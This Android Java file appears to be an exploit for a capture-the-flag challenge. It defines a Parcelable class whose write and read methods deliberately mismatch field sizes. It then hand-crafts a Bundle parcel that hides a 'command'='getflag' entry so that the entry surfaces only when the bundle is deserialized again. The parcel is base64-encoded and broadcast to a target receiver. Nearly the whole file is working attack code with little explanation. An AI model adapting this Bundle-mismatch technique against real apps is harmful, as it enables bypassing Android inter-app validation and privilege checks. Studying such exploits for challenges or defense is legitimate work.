package ga.nightshadow.broadcast_test;

import androidx.appcompat.app.AppCompatActivity;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Parcel;
import android.os.Parcelable;
import android.util.Base64;
import android.util.Log;

import java.io.ByteArrayOutputStream;
import java.io.IOException;

public class MainActivity extends AppCompatActivity {
    static class Message implements Parcelable {
        public static final Parcelable.Creator<Message> CREATOR = new Parcelable.Creator<Message>() {
            public Message createFromParcel(Parcel in) {
                return new Message(in);
            }

            public Message[] newArray(int size) {
                return new Message[size];
            }
        };
        String bssid;
        public int burstNumber;
        public int frameNumberPerBurstPeer;
        public int measurementFrameNumber;
        public int measurementType;
        public int retryAfterDuration;
        public int rssi;
        public int rssiSpread;
        public long rtt;
        public long rttSpread;
        public long rttStandardDeviation;
        public int status;
        public int successMeasurementFrameNumber;
        public long ts;
        public int txRate;

        public Message(Parcel in) {
            this.bssid = in.readString();
            this.burstNumber = in.readInt();
            this.measurementFrameNumber = in.readInt();
            this.successMeasurementFrameNumber = in.readInt();
            this.frameNumberPerBurstPeer = in.readInt();
            this.status = in.readInt();
            this.measurementType = in.readInt();
            this.retryAfterDuration = in.readInt();
            this.ts = in.readLong();
            this.rssi = in.readInt();
            this.rssiSpread = in.readInt();
            this.txRate = in.readInt();
            this.rtt = in.readLong();
            this.rttStandardDeviation = in.readLong();
            this.rttSpread = in.readLong();
        }

        public int describeContents() {
            return 0;
        }

        public void writeToParcel(Parcel a, int i) {
            a.writeString(this.bssid);
            a.writeInt(this.burstNumber);
            a.writeInt(this.measurementFrameNumber);
            a.writeInt(this.successMeasurementFrameNumber);
            a.writeInt(this.frameNumberPerBurstPeer);
            a.writeInt(this.status);
            a.writeInt(this.measurementType);
            a.writeInt(this.retryAfterDuration);
            a.writeLong(this.ts);
            a.writeInt(this.rssi);
            a.writeInt(this.rssiSpread);
            a.writeByte((byte) this.txRate);
            a.writeLong(this.rtt);
            a.writeLong(this.rttStandardDeviation);
            a.writeInt((int) this.rttSpread);
        }
    }

        String data;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
//        Intent itt = new Intent("com.de1ta.receiver1");
//        itt.setComponent(ComponentName.unflattenFromString("com.de1ta.broadcasttest/.MyReceiver1"));
        Intent itt = new Intent("re1");
        itt.setComponent(ComponentName.unflattenFromString("ga.nightshadow.broadcast_test/.re1"));

        Parcel a = Parcel.obtain();
        Parcel b = Parcel.obtain();
        a.writeInt(3);//Count
        String key = "mismatch";
//        while(key.hashCode()>=-1841832101){
//            key += ".";
//        }
        Log.i("hashcode", String.valueOf(key.hashCode()));
        a.writeString(key);
        a.writeInt(4);//type Parcable
        a.writeString("ga.nightshadow.broadcast_test.MainActivity$Message");
//        a.writeString("com.de1ta.broadcasttest.MainActivity$Message");

        a.writeString("bssid");
        a.writeInt(1);
        a.writeInt(2);
        a.writeInt(3);
        a.writeInt(4);
        a.writeInt(5);
        a.writeInt(6);
        a.writeInt(7);
        a.writeLong(8);
        a.writeInt(9);
        a.writeInt(10);
        a.writeInt(-1);//int to byte, txRate, but useless
        a.writeLong(11);
        a.writeLong(12);
        a.writeLong(0x11223344);
        // fake name commandxxxgetflag
        a.writeString("\7\0command\0\0\0\7\0getflag\0\0");
        a.writeInt(0);
        a.writeString("");
        a.writeString("command");
        a.writeInt(0);
        a.writeString("gotflag");
        int len = a.dataSize();
        b.writeInt(len);
        b.writeInt(0x4c444E42);
        b.appendFrom(a, 0, len);
        b.setDataPosition(0);

        byte[] raw = b.marshall();
        String output = Base64.encodeToString(raw, 0);
        Log.i("payload", output);
        data = output;
        itt.putExtra("data", data);
        itt.putExtra("id", 123);
        itt.setFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES);
        sendBroadcast(itt);

    }
}


